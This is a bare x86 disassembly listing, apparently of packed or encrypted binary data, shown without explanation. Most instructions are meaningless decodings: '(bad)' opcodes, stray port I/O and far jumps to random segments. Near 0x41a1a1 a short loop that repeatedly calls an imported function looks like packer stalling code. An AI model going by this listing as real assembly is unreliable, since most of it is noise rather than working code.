  419c01:	adc    esp,edx
  419c03:	jp     0x419c51
  419c05:	fistp  WORD PTR [edi+eax*2-0x23c3012d]
  419c0c:	in     eax,0x21
  419c0e:	scas   eax,DWORD PTR es:[edi]
  419c0f:	nop
  419c10:	fisub  WORD PTR [edi+ebp*8+0x306d497]
  419c17:	sbb    BYTE PTR [ecx+0x2c9922f2],ch
  419c1d:	xchg   edi,eax
  419c1e:	fmul   QWORD PTR [esi]
  419c20:	ins    DWORD PTR es:[edi],dx
  419c21:	xchg   edi,eax
  419c22:	mov    eax,ds:0xb71d8746
  419c27:	mov    bh,0xdf
  419c29:	push   es
  419c2a:	ins    BYTE PTR es:[edi],dx
  419c2b:	mov    al,0x47
  419c2d:	das    
  419c2e:	arpl   WORD PTR [esi-0x12],sp
  419c31:	jae    0x419bc8
  419c33:	or     BYTE PTR [edx],bl
  419c35:	mov    ch,ah
  419c37:	loopne 0x419bde
  419c39:	adc    esp,DWORD PTR [esi]
  419c3b:	add    esi,DWORD PTR [eax]
  419c3d:	xchg   ecx,eax
  419c3e:	mov    eax,0xcee99bef
  419c43:	lock ja 0x419c07
  419c46:	push   eax
  419c47:	sbb    dl,0x33
  419c4a:	xor    ebp,ecx
  419c4c:	mov    ebp,0xab0777a5
  419c51:	rcr    esp,cl
  419c53:	cmp    al,0x9d
  419c55:	loopne 0x419be1
  419c57:	sbb    BYTE PTR [esi+0x28],dl
  419c5a:	std    
  419c5b:	div    ebx
  419c5d:	ins    DWORD PTR es:[edi],dx
  419c5e:	add    al,0xf4
  419c60:	retf   
  419c61:	cmp    DWORD PTR [ebp+0xc],eax
  419c64:	int3   
  419c65:	sbb    ecx,ebx
  419c67:	fst    QWORD PTR [ebx+0x3808e4c1]
  419c6d:	cmp    al,0x18
  419c6f:	mov    ecx,0x9fc6d4ba
  419c74:	jp     0x419c48
  419c76:	adc    BYTE PTR [esi-0x25],bh
  419c79:	mov    bl,0x91
  419c7b:	inc    esp
  419c7c:	mov    ds:0x7933aae0,eax
  419c81:	add    edi,0x853dcc45
  419c87:	pushf  
  419c88:	clc    
  419c89:	and    edx,0x36c8
  419c8f:	jmp    0x41a1a1
  419c94:	retf   
  419c95:	leave  
  419c96:	int    0xcb
  419c98:	int    0xdb
  419c9a:	fxch   st(1)
  419c9c:	sub    eax,0x1a05fe08
  419ca1:	ror    BYTE PTR [ebx],0x7a
  419ca4:	jns    0x419c9b
  419ca6:	jg     0x419d20
  419ca8:	jae    0x419d26
  419caa:	js     0x419d24
  419cac:	test   al,0xe7
  419cae:	cmp    al,0xa9
  419cb0:	ins    DWORD PTR es:[edi],dx
  419cb1:	push   ds
  419cb2:	in     eax,0x5e
  419cb4:	sbb    eax,0xc7e80479
  419cb9:	mov    ch,0x89
  419cbb:	fucomip st,st(2)
  419cbd:	(bad)  
  419cbe:	scas   eax,DWORD PTR es:[edi]
  419cbf:	or     dl,BYTE PTR [eax]
  419cc1:	arpl   WORD PTR [edx],bp
  419cc3:	iret   
  419cc4:	inc    edx
  419cc5:	popa   
  419cc6:	iret   
  419cc7:	rol    bl,cl
  419cc9:	fs jl  0x419c99
  419ccc:	test   DWORD PTR [edi],esi
  419cce:	add    ch,dh
  419cd0:	xor    DWORD PTR gs:[ecx],0xd74b4d2
  419cd7:	adc    eax,ebp
  419cd9:	inc    edx
  419cda:	jne    0x419ce1
  419cdc:	sub    bh,BYTE PTR [edx]
  419cde:	mov    ah,0x34
  419ce0:	fmul   QWORD PTR [eax]
  419ce2:	mov    bh,0xd3
  419ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ce5:	cld    
  419ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ce7:	sbb    bl,BYTE PTR [edx-0x3f]
  419cea:	in     al,dx
  419ceb:	jne    0x419cc2
  419ced:	test   BYTE PTR [eax],dl
  419cef:	in     ax,0x1f
  419cf2:	outs   dx,BYTE PTR ds:[esi]
  419cf3:	inc    ecx
  419cf4:	std    
  419cf5:	dec    ebp
  419cf6:	sub    eax,0x5f6039b7
  419cfb:	lock xor BYTE PTR [edi+0x3a4d7375],dh
  419d02:	fwait
  419d03:	sub    edi,DWORD PTR [ebx-0x32]
  419d06:	xor    BYTE PTR [edx],al
  419d08:	pop    eax
  419d09:	mov    DWORD PTR [ecx+0xf],ebx
  419d0c:	std    
  419d0d:	test   DWORD PTR [ecx+0x1878863a],0x16db56ad
  419d17:	push   cs
  419d18:	pop    ecx
  419d19:	mov    eax,ds:0x45ace801
  419d1e:	lds    ecx,FWORD PTR [ecx+0x63]
  419d21:	dec    eax
  419d22:	neg    BYTE PTR [esi+0x70ed435b]
  419d28:	mov    cs,WORD PTR [ecx+0x7fecd012]
  419d2e:	xchg   esp,ebx
  419d30:	les    ebp,FWORD PTR [esi]
  419d32:	jmp    0xf165:0x25bb7686
  419d39:	repnz push esi
  419d3b:	popf   
  419d3c:	dec    edx
  419d3d:	test   DWORD PTR [eax],edi
  419d3f:	sbb    BYTE PTR [edi+0xa],ah
  419d42:	daa    
  419d43:	push   0xa9c16600
  419d48:	ins    DWORD PTR es:[edi],dx
  419d49:	iret   
  419d4a:	xchg   edx,eax
  419d4b:	sub    eax,0xdf1d2213
  419d50:	inc    ebp
  419d51:	mov    eax,ds:0xa46d8e31
  419d56:	sub    ah,BYTE PTR [eax+eax*1-0x7e00a7e2]
  419d5d:	pop    es
  419d5e:	iret   
  419d5f:	call   0x54c3:0x93e36a83
  419d66:	dec    ebp
  419d67:	sbb    DWORD PTR ds:0x49bf8a85,0x9
  419d6e:	pop    es
  419d6f:	pop    ds
  419d70:	push   eax
  419d71:	adc    dh,BYTE PTR [esi+0x7fc1c6bb]
  419d77:	jno    0x419da3
  419d79:	cwde   
  419d7a:	xor    BYTE PTR [eax+0x58],dh
  419d7d:	and    bh,BYTE PTR [ecx+0x2903e533]
  419d83:	(bad)  
  419d84:	jecxz  0x419da3
  419d86:	fsubr  st(5),st
  419d88:	repnz (bad) 
  419d8a:	leave  
  419d8b:	jg     0x419da3
  419d8d:	add    cl,dl
  419d8f:	jbe    0x419da4
  419d91:	pop    edx
  419d92:	test   BYTE PTR [edx+0x6d],cl
  419d95:	dec    ecx
  419d96:	lds    eax,FWORD PTR [ecx+0x19]
  419d99:	lea    eax,ss:[edi]
  419d9c:	jae    0x419d81
  419d9e:	mov    dl,0xdc
  419da0:	leave  
  419da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419da2:	sbb    bl,BYTE PTR [eax-0x6b]
  419da5:	(bad)  
  419da6:	je     0x419e1c
  419da8:	add    ecx,DWORD PTR [eax]
  419daa:	dec    edi
  419dab:	out    0x73,al
  419dad:	add    BYTE PTR [ecx+eax*4],bh
  419db0:	test   eax,0xeda9ad0a
  419db5:	sub    DWORD PTR [edx-0x4e],eax
  419db8:	aad    0xa4
  419dba:	inc    ecx
  419dbb:	imul   ebp,DWORD PTR [ebx],0xffffffd5
  419dbe:	cs stos DWORD PTR es:[edi],eax
  419dc0:	cs retf 
  419dc2:	fiadd  DWORD PTR [edx+0x5750408c]
  419dc8:	pop    edi
  419dc9:	sar    DWORD PTR ds:0x281a22b0,1
  419dcf:	jae    0x419d67
  419dd1:	test   eax,0xcf951bf1
  419dd6:	lahf   
  419dd7:	push   0x8532ebb8
  419ddc:	sub    edx,DWORD PTR [esi+0x25f77ccd]
  419de2:	push   ebp
  419de3:	sub    bl,BYTE PTR [edx]
  419de5:	(bad)  
  419de6:	pop    ds
  419de7:	lods   al,BYTE PTR ds:[esi]
  419de8:	inc    esp
  419de9:	inc    esp
  419dea:	lods   eax,DWORD PTR ds:[esi]
  419deb:	adc    ebx,DWORD PTR [esi+0x3e3838b9]
  419df1:	jp     0x419e2d
  419df3:	sahf   
  419df4:	cdq    
  419df5:	fldl2t 
  419df7:	int3   
  419df8:	neg    cl
  419dfa:	loopne 0x419e53
  419dfc:	jne    0x419e75
  419dfe:	pop    ebx
  419dff:	pop    ecx
  419e00:	mov    ebp,0x62d7e1c7
  419e05:	call   0x425de9ac
  419e0a:	test   al,0x52
  419e0c:	xchg   ch,dl
  419e0e:	adc    BYTE PTR [esi+0xbce479e],al
  419e14:	and    esi,DWORD PTR [ebp+edi*1+0x7b]
  419e18:	nop
  419e19:	les    ecx,FWORD PTR ds:0xe8d2fd81
  419e1f:	lds    ebp,FWORD PTR ds:0xfc15e5f2
  419e25:	jns    0x419e2b
  419e27:	sub    ebp,DWORD PTR [edx]
  419e29:	ret    
  419e2a:	add    DWORD PTR [edx+0x60d06cb],ebp
  419e30:	icebp  
  419e31:	sti    
  419e32:	push   ecx
  419e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e34:	pop    ds
  419e35:	in     eax,0xad
  419e37:	(bad)  
  419e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e39:	pop    edi
  419e3a:	jae    0x419df7
  419e3c:	xor    ch,cl
  419e3e:	cdq    
  419e3f:	imul   ecx,DWORD PTR [edi-0x33b931f8],0x555f0f38
  419e49:	shl    esi,0xf5
  419e4c:	lock push 0xffffffdc
  419e4f:	(bad)
  419e52:	leave  
  419e53:	or     eax,0x39b3ad3d
  419e58:	dec    edi
  419e59:	ins    DWORD PTR es:[edi],dx
  419e5a:	cmp    DWORD PTR [edx+0x3614e49e],0x4b523a75
  419e64:	inc    esp
  419e65:	dec    ebp
  419e66:	mov    cl,0xb2
  419e68:	cli    
  419e69:	mov    dh,0x1
  419e6b:	scas   eax,DWORD PTR es:[edi]
  419e6c:	sbb    DWORD PTR [ecx-0x50],eax
  419e6f:	pop    ds
  419e70:	leave  
  419e71:	mov    ch,0xe9
  419e73:	jb     0x419e02
  419e75:	mov    ebp,0x81fff284
  419e7a:	xor    al,0x49
  419e7c:	push   edi
  419e7d:	adc    ebx,DWORD PTR ds:0x4349b690
  419e83:	cmp    BYTE PTR [edx],cl
  419e85:	xor    cl,BYTE PTR [esi]
  419e87:	add    DWORD PTR ds:0x81dbd8a0,eax
  419e8d:	daa    
  419e8e:	xor    al,0x3a
  419e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e91:	jae    0x419ef2
  419e93:	adc    BYTE PTR [edi],al
  419e95:	or     bl,dl
  419e97:	inc    edx
  419e98:	and    bl,BYTE PTR [edi]
  419e9a:	mov    dh,0xdf
  419e9c:	ror    BYTE PTR [ecx-0x11],1
  419e9f:	(bad)  
  419ea0:	push   eax
  419ea1:	or     ebx,DWORD PTR [eax]
  419ea3:	add    al,BYTE PTR [edx-0x5b]
  419ea6:	mov    edi,0xf6c6a47d
  419eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419eac:	or     al,0x6b
  419eae:	scas   al,BYTE PTR es:[edi]
  419eaf:	mov    ebx,0xed6d8e1d
  419eb4:	mov    edx,0x692169a0
  419eb9:	je     0x419f34
  419ebb:	fdivr  DWORD PTR [esp+eax*8]
  419ebe:	push   ecx
  419ebf:	xchg   ecx,eax
  419ec0:	ja     0x419f33
  419ec2:	or     eax,0x40510ae0
  419ec7:	enter  0xbc2f,0xb
  419ecb:	ins    BYTE PTR es:[edi],dx
  419ecc:	push   es
  419ecd:	inc    ebx
  419ece:	in     al,0xa8
  419ed0:	mov    dh,0xaf
  419ed2:	(bad)  
  419ed3:	xor    DWORD PTR [ebx],ecx
  419ed5:	in     al,0xde
  419ed7:	es inc eax
  419ed9:	add    BYTE PTR [esi+eax*4],dh
  419edc:	(bad)  
  419ede:	es sahf 
  419ee0:	add    eax,0x48141f6a
  419ee5:	repnz fimul WORD PTR [edx-0x448a1aa8]
  419eec:	iret   
  419eed:	ja     0x419eb7
  419eef:	mov    eax,0x6f0a248b
  419ef4:	or     eax,0x94cf0637
  419ef9:	and    eax,0xcd11a18a
  419efe:	push   edx
  419eff:	div    DWORD PTR ds:0x1d421833
  419f05:	inc    ebx
  419f06:	mov    dh,0xe8
  419f08:	iret   
  419f09:	sub    ah,cl
  419f0b:	fcmovnu st,st(0)
  419f0d:	in     eax,0x23
  419f0f:	xchg   ebx,eax
  419f10:	outs   dx,BYTE PTR ds:[esi]
  419f11:	daa    
  419f12:	inc    ebp
  419f13:	adc    al,0xb0
  419f15:	in     eax,dx
  419f16:	dec    ebx
  419f17:	mov    dh,0xea
  419f19:	mov    al,ds:0xb356075
  419f1e:	xchg   edi,eax
  419f1f:	and    BYTE PTR [ecx],0x53
  419f22:	data16 daa 
  419f24:	adc    dh,BYTE PTR ds:0xf145d2e3
  419f2a:	sar    BYTE PTR [edx],cl
  419f2c:	or     dh,BYTE PTR [ecx+ebx*2]
  419f2f:	popf   
  419f30:	imul   edi,DWORD PTR [ecx-0x56],0x52b1190a
  419f37:	shl    BYTE PTR [edi-0x60ed2f50],0xca
  419f3e:	pop    edi
  419f3f:	jo     0x419f33
  419f41:	cmp    cl,0xe4
  419f44:	mov    bh,0xf8
  419f46:	jl     0x419fa4
  419f48:	xchg   esi,eax
  419f49:	sbb    DWORD PTR [ebx+0xe],ebx
  419f4c:	add    ebp,edi
  419f4e:	and    al,0x5b
  419f50:	aad    0xbd
  419f52:	out    0xf1,eax
  419f54:	pop    es
  419f55:	sbb    BYTE PTR [edx],dl
  419f57:	fisubr WORD PTR [ecx+0x5bad9b0a]
  419f5d:	add    ecx,esp
  419f5f:	xor    DWORD PTR ds:0x592cfa22,esi
  419f65:	pop    esi
  419f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f67:	rcr    DWORD PTR [eax],0xaa
  419f6a:	pushf  
  419f6b:	jp     0x419eed
  419f6d:	sar    BYTE PTR [ecx],cl
  419f6f:	sub    eax,0xe804ecf0
  419f74:	daa    
  419f75:	loop   0x419f9f
  419f77:	js     0x419fce
  419f79:	outs   dx,DWORD PTR ds:[esi]
  419f7a:	inc    esp
  419f7c:	mov    WORD PTR [edx],es
  419f7e:	add    eax,0x99120fdd
  419f83:	ins    DWORD PTR es:[edi],dx
  419f84:	or     al,0x55
  419f86:	loopne 0x419f99
  419f88:	out    dx,al
  419f89:	sbb    esp,eax
  419f8b:	jb     0x419fc4
  419f8d:	xchg   BYTE PTR [ebx],dl
  419f8f:	adc    ch,al
  419f91:	fdiv   QWORD PTR [eax]
  419f93:	or     ebx,esi
  419f95:	inc    edi
  419f96:	in     al,0xe
  419f98:	jl     0x419fc1
  419f9a:	add    BYTE PTR [eax+eiz*8],ah
  419f9d:	xchg   edi,eax
  419f9e:	sub    al,0x5a
  419fa0:	mov    dl,0x5e
  419fa2:	push   ebx
  419fa3:	and    eax,0xfecec5b0
  419fa8:	or     eax,0x8c2c0e28
  419fad:	out    0xc5,al
  419faf:	ret    0x74a2
  419fb2:	cmp    al,0x9a
  419fb4:	sbb    bh,BYTE PTR [ecx-0x418ecac7]
  419fba:	sbb    eax,0x88bab0a3
  419fbf:	inc    eax
  419fc0:	ficomp WORD PTR [edx+esi*1+0x6e8d079f]
  419fc7:	pushf  
  419fc8:	(bad)  
  419fca:	sbb    ecx,DWORD PTR [ebx-0x45]
  419fcd:	fist   WORD PTR [edx]
  419fcf:	add    BYTE PTR cs:[edi+edi*8-0x5af3cb9f],ah
  419fd7:	inc    ebx
  419fd8:	add    dl,BYTE PTR [esp+esi*8-0x5392b0be]
  419fdf:	xor    cl,BYTE PTR [eax+edi*2-0x76]
  419fe3:	data16 mov al,0xb4
  419fe6:	cmp    dh,BYTE PTR [ecx-0x751332c1]
  419fec:	jo     0x419fd4
  419fee:	jae    0x419f9c
  419ff0:	pop    edx
  419ff1:	not    BYTE PTR [edx+edi*4+0x62]
  419ff5:	out    0x1e,al
  419ff7:	jns    0x41a036
  419ff9:	daa    
  419ffa:	ds dec ecx
  419ffc:	sbb    eax,0xd697a76d
  41a001:	in     al,0x71
  41a003:	mov    ds:0xfcc9f7f6,al
  41a009:	sub    eax,0x9369d7e2
  41a00e:	pushf  
  41a00f:	lahf   
  41a010:	std    
  41a011:	fnstcw WORD PTR [edi+0x5a]
  41a014:	jp     0x419fa7
  41a016:	pop    ebp
  41a017:	add    al,0x60
  41a019:	jmp    0x41a06b
  41a01b:	or     al,0x7c
  41a01d:	xlat   BYTE PTR cs:[ebx]
  41a01f:	jae    0x419fdc
  41a021:	lahf   
  41a022:	sub    DWORD PTR [edx],edx
  41a024:	mov    al,ds:0xd1bee6cc
  41a029:	mov    dl,0x7e
  41a02b:	mov    al,ds:0xe7f9144e
  41a030:	mov    ds:0x859c5785,al
  41a035:	sbb    ecx,DWORD PTR [edi+0x17]
  41a038:	dec    esi
  41a039:	sub    eax,0x1c6b765d
  41a03e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a03f:	(bad)  
  41a040:	cli    
  41a041:	sbb    eax,0x18928749
  41a046:	addr16 jl 0x41a053
  41a049:	mov    edi,0xf2f7c0f1
  41a04e:	mov    dl,0x4a
  41a050:	adc    DWORD PTR [edi+0x6a99dda2],ebp
  41a056:	fist   DWORD PTR [ebx-0xf]
  41a059:	rol    BYTE PTR [esi*8-0x4626badd],1
  41a060:	jne    0x419ff7
  41a062:	loope  0x41a0a9
  41a064:	jecxz  0x41a08e
  41a066:	ins    BYTE PTR es:[edi],dx
  41a067:	xor    BYTE PTR [ebp+0x72],al
  41a06a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a06b:	pushf  
  41a06c:	les    eax,FWORD PTR [edx]
  41a06e:	xchg   esi,eax
  41a06f:	or     dh,BYTE PTR [edi]
  41a071:	test   DWORD PTR [ecx+edi*8-0x9453fdd],edx
  41a078:	lea    edx,[esi-0x78668531]
  41a07e:	dec    ecx
  41a07f:	xor    eax,0x876d1bd4
  41a084:	add    DWORD PTR [eax],esp
  41a086:	adc    DWORD PTR [eax],esi
  41a088:	dec    edi
  41a089:	stos   BYTE PTR es:[edi],al
  41a08a:	xchg   ebp,eax
  41a08b:	pop    ecx
  41a08c:	mov    edi,0x90455605
  41a091:	fdivr  DWORD PTR [ecx-0xc6b9bdc]
  41a097:	scas   al,BYTE PTR es:[edi]
  41a098:	sbb    BYTE PTR [esi+0x3],dl
  41a09b:	std    
  41a09c:	imul   edx,edx,0x523e8f17
  41a0a2:	pshufw mm6,mm6,0xc2
  41a0a6:	jg     0x41a036
  41a0a8:	std    
  41a0a9:	iret   
  41a0aa:	jne    0x41a0e7
  41a0ac:	sub    ebp,esi
  41a0ae:	imul   BYTE PTR [edi]
  41a0b0:	rol    DWORD PTR [ebp+0x53be1844],0x2
  41a0b7:	push   ebp
  41a0b8:	and    edx,ecx
  41a0ba:	retf   
  41a0bb:	loop   0x41a047
  41a0bd:	fild   DWORD PTR [edx-0x757a6222]
  41a0c3:	and    edi,DWORD PTR [ecx]
  41a0c5:	cs jns 0x41a0e9
  41a0c8:	and    eax,0x6ee08038
  41a0cd:	into   
  41a0ce:	xchg   esp,eax
  41a0cf:	in     al,dx
  41a0d0:	into   
  41a0d1:	inc    ecx
  41a0d2:	add    DWORD PTR [ecx-0x5a],edx
  41a0d5:	sbb    ecx,esi
  41a0d7:	mov    al,0x3f
  41a0d9:	call   0x7814ec9
  41a0de:	jo     0x41a148
  41a0e0:	sbb    al,0xba
  41a0e2:	mov    ebp,0x5c0f8687
  41a0e7:	xchg   edi,eax
  41a0e8:	leave  
  41a0e9:	mov    eax,DWORD PTR [edx+0x73]
  41a0ec:	mov    bh,0x93
  41a0ee:	push   es
  41a0ef:	cli    
  41a0f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0f1:	das    
  41a0f2:	dec    ecx
  41a0f3:	(bad)  
  41a0f4:	fmul   QWORD PTR [esi]
  41a0f6:	scas   eax,DWORD PTR es:[edi]
  41a0f7:	lahf   
  41a0f8:	push   0x12
  41a0fa:	fnstcw WORD PTR [esi]
  41a0fc:	cdq    
  41a0fd:	add    edi,eax
  41a0ff:	mov    bh,0x7
  41a101:	jns    0x41a127
  41a103:	rcl    DWORD PTR [ebx+0x6d],cl
  41a106:	not    edi
  41a108:	sbb    eax,edx
  41a10a:	cs enter 0xc3c0,0x4a
  41a10f:	or     ebp,edx
  41a111:	call   FWORD PTR [eax-0x45]
  41a114:	and    eax,0x2a3f7731
  41a119:	dec    eax
  41a11a:	adc    eax,eax
  41a11c:	dec    bh
  41a11e:	or     BYTE PTR [ebx],bh
  41a120:	xchg   ebp,eax
  41a121:	(bad)  
  41a122:	xchg   BYTE PTR ds:0xa620ceb9,bh
  41a128:	out    dx,al
  41a129:	inc    esi
  41a12a:	int3   
  41a12b:	and    dh,BYTE PTR [edx+0x7d]
  41a12e:	sbb    BYTE PTR [edi-0xe3d63a7],bh
  41a134:	fidivr DWORD PTR es:[edx-0x77107936]
  41a13b:	add    al,0x0
  41a13d:	xchg   esp,esi
  41a13f:	sub    DWORD PTR [ecx+0x5b],0x64
  41a143:	xchg   DWORD PTR [edi+0x53],ebp
  41a146:	inc    ebx
  41a147:	stos   BYTE PTR es:[edi],al
  41a148:	xor    BYTE PTR [esi+0x51],ch
  41a14b:	ret    0xa66f
  41a14e:	cmp    al,0xad
  41a150:	and    eax,0xe3e9af00
  41a155:	cmp    ebx,DWORD PTR [ebp+0x30]
  41a158:	ret    
  41a159:	mov    eax,0xa47db0f7
  41a15e:	cmp    ch,BYTE PTR [esi+0xb]
  41a161:	dec    edi
  41a162:	xchg   esi,eax
  41a163:	cs (bad) 
  41a165:	fild   DWORD PTR ds:0xddfabbab
  41a16b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a16c:	push   ebx
  41a16d:	ds dec eax
  41a16f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a170:	out    0x3c,eax
  41a172:	es cmp dh,bl
  41a175:	jl     0x41a120
  41a177:	imul   esi,DWORD PTR [edi+0x7],0xd38c48b9
  41a17e:	fwait
  41a17f:	dec    ecx
  41a180:	and    al,0xe8
  41a182:	jb     0x41a146
  41a184:	jo     0x41a166
  41a186:	(bad)  
  41a187:	pop    edx
  41a188:	pop    eax
  41a189:	test   eax,edx
  41a18b:	mov    ebx,0x5fa89157
  41a190:	inc    ebp
  41a191:	inc    edx
  41a192:	jge    0x41a174
  41a194:	sti    
  41a195:	dec    BYTE PTR [ebp+0x5d]
  41a198:	aam    0x78
  41a19a:	pushf  
  41a19b:	cmp    edx,DWORD PTR [edi]
  41a19d:	push   0x51
  41a19f:	aaa    
  41a1a0:	(bad)  
  41a1a1:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  41a1a8:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  41a1af:	mov    edx,DWORD PTR [ebp+0x8]
  41a1b2:	mov    DWORD PTR ds:0x42a35d,0x17
  41a1bc:	cmp    DWORD PTR ds:0x42a35d,0x0
  41a1c3:	je     0x41a70a
  41a1c9:	cmp    DWORD PTR ds:0x42a35d,0x20
  41a1d0:	jne    0x41a1e6
  41a1d6:	push   0x8ff4
  41a1db:	push   0x7f63
  41a1e0:	call   DWORD PTR ds:0x425024
  41a1e6:	mov    edi,DWORD PTR ds:0x42a35d
  41a1ec:	dec    edi
  41a1ed:	mov    DWORD PTR ds:0x42a35d,edi
  41a1f3:	jmp    0x41a1bc
  41a1f8:	jmp    0x41a70a
  41a1fd:	(bad)  
  41a1fe:	iret   
  41a1ff:	cmp    eax,0xdad1d5d3
  41a204:	fld    st(7)
  41a206:	outs   dx,DWORD PTR ds:[esi]
  41a207:	fisubr WORD PTR [edi+0x4cbe6573]
  41a20d:	ins    BYTE PTR es:[edi],dx
  41a20e:	clc    
  41a20f:	jg     0x41a289
  41a211:	jae    0x41a28f
  41a213:	js     0x41a28d
  41a215:	mov    eax,0xbd09dd53
  41a21a:	test   al,0x61
  41a21c:	aam    0x8c
  41a21e:	cwde   
  41a21f:	inc    eax
  41a220:	ret    
  41a221:	aaa    
  41a222:	sub    eax,0x51c22b92
  41a227:	fdivr  QWORD PTR [edi]
  41a229:	fidivr WORD PTR [edi-0x44]
  41a22c:	rcr    BYTE PTR [ecx],0xd8
  41a22f:	mov    eax,ds:0xef95d9
  41a234:	aas    
  41a235:	data16 mov ah,0x1
  41a238:	scas   al,BYTE PTR es:[edi]
  41a239:	mov    DWORD PTR [eax+0xb],esp
  41a23c:	test   eax,0x39ee0a81
  41a241:	or     eax,0x52e5bf8d
  41a246:	rol    DWORD PTR [ebp+0x59b2573e],0x55
  41a24d:	inc    eax
  41a24e:	faddp  st(4),st
  41a250:	aam    0x6b
  41a252:	pop    ebx
  41a253:	or     eax,0x727cc594
  41a258:	test   ch,al
  41a25a:	sbb    edi,ebx
  41a25c:	sub    dh,BYTE PTR [eax]
  41a25e:	inc    eax
  41a25f:	cmp    ecx,ecx
  41a261:	pushf  
  41a262:	adc    al,0xc3
  41a264:	push   ebp
  41a265:	enter  0x5448,0x5f
  41a269:	int    0x12
  41a26b:	jno    0x41a2bf
  41a26d:	cmp    BYTE PTR [ebp-0x2e6bac05],ah
  41a273:	mov    BYTE PTR [esi-0x35],ah
  41a276:	call   0x7775:0x364e70e1
  41a27d:	mov    al,0x27
  41a280:	adc    eax,0xe8fa66a3
  41a285:	iret   
  41a286:	aam    0x59
  41a288:	outs   dx,DWORD PTR ds:[esi]
  41a289:	xor    al,0x42
  41a28b:	pop    edi
  41a28c:	xor    DWORD PTR [eax-0x6e95bc53],ecx
  41a292:	loope  0x41a23e
  41a294:	push   0xffffffae
  41a296:	hlt    
  41a297:	or     DWORD PTR [ebp-0x2bf1dd82],0xa85d029c
  41a2a1:	push   0xffffffe4
  41a2a3:	mov    bl,0x5a
  41a2a5:	xor    al,0x63
  41a2a7:	jecxz  0x41a2ce
  41a2a9:	and    DWORD PTR [esi+0x59],edx
  41a2ac:	inc    ebx
  41a2ad:	imul   eax,esi,0xffffff9d
  41a2b0:	adc    esi,DWORD PTR [ecx+0x6a1746ec]
  41a2b6:	jecxz  0x41a2bb
  41a2b8:	sub    eax,0xfb0bd791
  41a2bd:	sbb    eax,0xda9412a
  41a2c2:	jns    0x41a2cd
  41a2c4:	sbb    dh,BYTE PTR fs:[eax]
  41a2c7:	jmp    0x7634:0xddd1fc9d
  41a2ce:	loop   0x41a2ef
  41a2d0:	fst    QWORD PTR [edx+eiz*8+0x345e3d87]
  41a2d7:	sbb    eax,0x3d15d0d4
  41a2dc:	sub    esi,DWORD PTR [esi]
  41a2de:	mov    al,ds:0xb4567686
  41a2e3:	cld    
  41a2e4:	shr    DWORD PTR ds:0x5de13994,1
  41a2ea:	push   0xffffffba
  41a2ec:	mov    eax,0xf6f33e81
  41a2f1:	aam    0x7
  41a2f3:	jg     0x41a359
  41a2f5:	cmp    BYTE PTR fs:[ebx-0x7b],ah
  41a2f9:	jae    0x41a34a
  41a2fb:	sahf   
  41a2fc:	shl    BYTE PTR [ebx],1
  41a2fe:	mov    eax,0xae6c68f6
  41a303:	sub    bh,BYTE PTR [eax+0x75]
  41a306:	ret    
  41a307:	scas   al,BYTE PTR es:[edi]
  41a308:	pop    ecx
  41a309:	mov    esp,DWORD PTR [eax]
  41a30b:	adc    BYTE PTR [eax+ebx*1-0x12],bl
  41a30f:	in     al,dx
  41a310:	pop    ecx
  41a311:	pop    edx
  41a312:	xchg   esi,eax
  41a313:	or     DWORD PTR [edi-0x18],ecx
  41a316:	push   ecx
  41a317:	adc    cl,BYTE PTR [edx+0x13576e44]
  41a31d:	into   
  41a31e:	fdivr  QWORD PTR [edi]
  41a320:	mov    esp,0x6d31481a
  41a325:	(bad)  
  41a326:	das    
  41a327:	ja     0x41a332
  41a329:	call   0x8ebd0e90
  41a32e:	dec    esi
  41a32f:	repz jns 0x41a38a
  41a332:	sub    al,0xdb
  41a334:	loopne 0x41a2e3
  41a336:	and    BYTE PTR [esi-0x79],0xf1
  41a33a:	js     0x41a2f8
  41a33c:	xchg   ecx,eax
  41a33d:	lea    eax,[edx]
  41a33f:	mov    esi,0xac8c08b9
  41a344:	sahf   
  41a345:	sub    cl,BYTE PTR [ecx+ebp*8]
  41a348:	rol    ah,cl
  41a34a:	push   ds
  41a34b:	add    BYTE PTR [ebx],bl
  41a34d:	dec    edi
  41a34e:	push   cs
  41a34f:	js     0x41a39c
  41a351:	das    
  41a352:	aam    0xb0
  41a354:	mov    ds:0xbab0bd67,al
  41a359:	mov    dl,0x47
  41a35b:	and    al,0xab
  41a35d:	fsub   DWORD PTR [ebx]
  41a35f:	inc    ebp
  41a360:	mov    edx,0x8bf39967
  41a365:	ficomp DWORD PTR [eax-0x7ccc549e]
  41a36b:	inc    edx
  41a36c:	scas   eax,DWORD PTR es:[edi]
  41a36d:	pushf  
  41a36e:	jbe    0x41a3ef
  41a370:	xchg   ebp,eax
  41a371:	xor    BYTE PTR [ebp-0x20],ah
  41a374:	daa    
  41a375:	pop    ds
  41a376:	aad    0xb0
  41a378:	enter  0x532b,0x84
  41a37c:	xchg   sp,ax
  41a37e:	ror    BYTE PTR [ecx],1
  41a380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a381:	inc    ebx
  41a382:	push   cs
  41a383:	jg     0x41a36f
  41a385:	ret    
  41a386:	jno    0x41a3f2
  41a388:	add    edx,DWORD PTR [ecx]
  41a38a:	addr16 jmp 0xfb6659df
  41a390:	loopne 0x41a3cc
  41a392:	in     eax,dx
  41a393:	push   eax
  41a394:	mov    dl,0x8b
  41a396:	leave  
  41a397:	stos   BYTE PTR es:[edi],al
  41a398:	mov    ebx,0xe85937d
  41a39d:	in     eax,dx
  41a39e:	add    al,BYTE PTR [esi+ebx*4-0x283a224]
  41a3a5:	sbb    DWORD PTR [esi],ecx
  41a3a7:	addr16 push ecx
  41a3a9:	or     eax,0xb0616390
  41a3ae:	nop
